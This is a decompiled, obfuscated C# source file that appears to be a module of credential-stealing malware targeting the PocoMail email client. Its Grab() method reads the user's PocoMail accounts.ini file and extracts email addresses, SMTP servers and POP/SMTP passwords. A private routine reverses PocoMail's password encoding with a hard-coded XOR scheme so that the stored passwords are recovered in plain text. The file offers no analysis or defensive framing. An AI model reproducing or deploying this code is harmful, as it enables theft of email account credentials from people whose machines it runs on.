using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using _81d;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class flA3 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string X2HsR6
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public flA3()
	{
		X2HsR6 = "PocoMail";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		string text = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 2)
			{
				text = Environment.GetEnvironmentVariable("appdata") + "\\Pocomail\\accounts.ini";
				num = 3;
			}
			if (num == 4)
			{
				return list;
			}
			if (num == 3)
			{
				if (File.Exists(text))
				{
					break;
				}
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		kKdeGISe kKdeGISe2 = new kKdeGISe(text);
		foreach (string key in kKdeGISe2.Keys)
		{
			ii68 ii69 = new ii68();
			foreach (string key2 in kKdeGISe2[key].Keys)
			{
				switch (key2)
				{
				case "Email":
					ii69.S8v = kKdeGISe2[key][key2];
					break;
				case "POPPass":
				case "SMTPPass":
					if (!string.IsNullOrEmpty(kKdeGISe2[key][key2]))
					{
						ii69._9H5rP7hg2 = CrhWlqY(kKdeGISe2[key][key2], 0);
					}
					break;
				case "SMTP":
					ii69.byIdLuuGZbL = kKdeGISe2[key][key2];
					break;
				}
			}
			ii69.oVAe = X2HsR6;
			list.Add(ii69);
		}
		return list;
	}

	private static string CrhWlqY(string YCWgDYtSOpH, int NzzQnQc)
	{
		int num = 0;
		byte[] array = default;
		byte[] array2 = default;
		int num2 = default;
		do
		{
			if (num == 2)
			{
				array = new byte[array2.Length];
				num = 3;
			}
			switch (num)
			{
			case 5:
			case 7:
				try
				{
					for (int i = 0; i <= array2.Length - 1; i++)
					{
						array[i] = BitConverter.GetBytes(array2[i] ^ (num2 >> 8))[0];
						num2 = (array2[i] + num2) * 33089 + 12657;
						num2 = BitConverter.ToInt16(BitConverter.GetBytes(num2), 0);
					}
				}
				catch
				{
					return "";
				}
				return Encoding.Default.GetString(array);
			case 1:
				array2 = b4v.H4VWdV77v(YCWgDYtSOpH);
				num = 2;
				break;
			}
			if (num == 6)
			{
				goto IL_0159;
			}
			goto IL_016b;
			IL_016b:
			if (num == 3)
			{
				if (NzzQnQc == 0)
				{
					goto IL_0159;
				}
				num = 4;
			}
			if (num == 4)
			{
				num2 = 9527;
				num = 5;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_0159:
			num2 = 10906;
			num = 7;
			goto IL_016b;
		}
		while (num != 8);
		string result = default;
		return result;
	}
}
